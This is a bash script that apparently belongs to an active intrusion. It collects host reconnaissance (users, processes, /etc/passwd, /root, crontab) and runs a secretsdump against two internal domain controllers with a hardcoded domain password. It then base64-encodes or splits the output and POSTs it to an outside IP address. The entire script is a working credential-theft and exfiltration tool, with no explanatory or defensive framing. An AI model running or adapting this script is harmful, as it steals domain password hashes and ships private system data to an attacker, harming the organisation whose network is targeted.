#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# secretsdump DRSUAPI via rez — full example (bundle one lacks __main__)
export PYTHONPATH=/tmp/imp
O=/tmp/.SECD2.txt
: > "$O"
for ip in 10.61.10.11 10.61.10.10; do
  echo "== secretsdump $ip ==" >> "$O"
  timeout 2400 python3 /tmp/.secdump2.py -just-dc-ntlm 'MLT/rez:!QAZxsw2@'"$ip" >> "$O" 2>&1
  echo "== RC $? ==" >> "$O"
done
S=$(stat -c%s "$O" 2>/dev/null || echo 0)
if [ "$S" -gt 500000 ]; then
  split -b 400k "$O" /tmp/.sc2_
  for x in /tmp/.sc2_*; do
    curl -sm60 -X POST --data-binary @"$x" http://131.123.43.239/up -H "X-Name: mel2_secd_part"
  done
else
  curl -sm60 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel2_secd"
fi
echo SECD2_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


